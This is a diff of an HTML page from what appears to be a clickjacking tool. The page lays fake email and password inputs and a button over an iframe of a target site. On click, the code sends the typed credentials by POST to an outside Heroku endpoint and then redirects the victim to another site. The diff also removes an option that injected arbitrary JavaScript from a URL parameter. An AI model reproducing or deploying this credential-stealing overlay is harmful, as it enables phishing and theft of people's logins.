@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <script type="text/javascript" src="resources/js/jquery-1.11.0.js"></script>
-    <link rel="shortcut icon" type="image/x-icon" href="resources/img/logo.ico">
+    <link rel="shortcut icon" type="image/x-icon" href="resources/img/hacker.png">
 
     <script type="text/javascript">
         var config_url = '';
@@ -40,8 +40,6 @@
             console.log("usernameStyleParam", usernameStyleParam);
 
             var buttonStyleParam = getURLParameter('buttonStyle');
-            var customJavaScript = getURLParameter('customJavaScript');
-            console.log(customJavaScript);
 
             var emailStyle = usernameStyleParam + 'position: absolute; z-index: 2; top: ' + userNameTop + 'px; left: ' + userNameLeft + 'px;';
             $('#inputMalEmail').attr('style', emailStyle);
@@ -51,32 +49,28 @@
             $('#jacksButton').attr('style', buttonStyle);
             $("#targetIframe").attr('src', targetURL);
             $('#jacksButton').click(function(e) {
-                if (customJavaScript.length > 0) {
-                    $('<script>').attr('type', 'text/javascript').text(customJavaScript).appendTo('head');
-                } else {
-                    var jacksEmail = $('#inputMalEmail').val();
-                    var jacksPassword = $('#inputMalPassword').val();
-                    // console.log('Email: ' + jacksEmail);
-                    // alert('Captured Creds are: \nUsername is: ' + jacksEmail + ' \nAND\nPassword is: ' + jacksPassword);
 
-                    $.ajax({
-                        url: "https://userinfoclickjacking.herokuapp.com/api/users",
-                        type: "POST",
+                var jacksEmail = $('#inputMalEmail').val();
+                var jacksPassword = $('#inputMalPassword').val();
 
-                        data: {
-                            email: jacksEmail,
-                            password: jacksPassword
-                        },
-                        contentType: "application/x-www-form-urlencoded",
+                $.ajax({
+                    url: "https://userinfoclickjacking.herokuapp.com/api/users",
+                    type: "POST",
+
+                    data: {
+                        email: jacksEmail,
+                        password: jacksPassword
+                    },
+                    contentType: "application/x-www-form-urlencoded",
 
 
-                        success: function(response) {
-                            console.log(response);
-                        },
-                        error: function(err) {}
-                    })
-                    window.location.href = "https://imdb-frontend.herokuapp.com/";
-                }
+                    success: function(response) {
+                        console.log(response);
+                    },
+                    error: function(err) {}
+                })
+                window.location.href = "https://imdb-frontend.herokuapp.com/";
+
             });
         });
     </script>
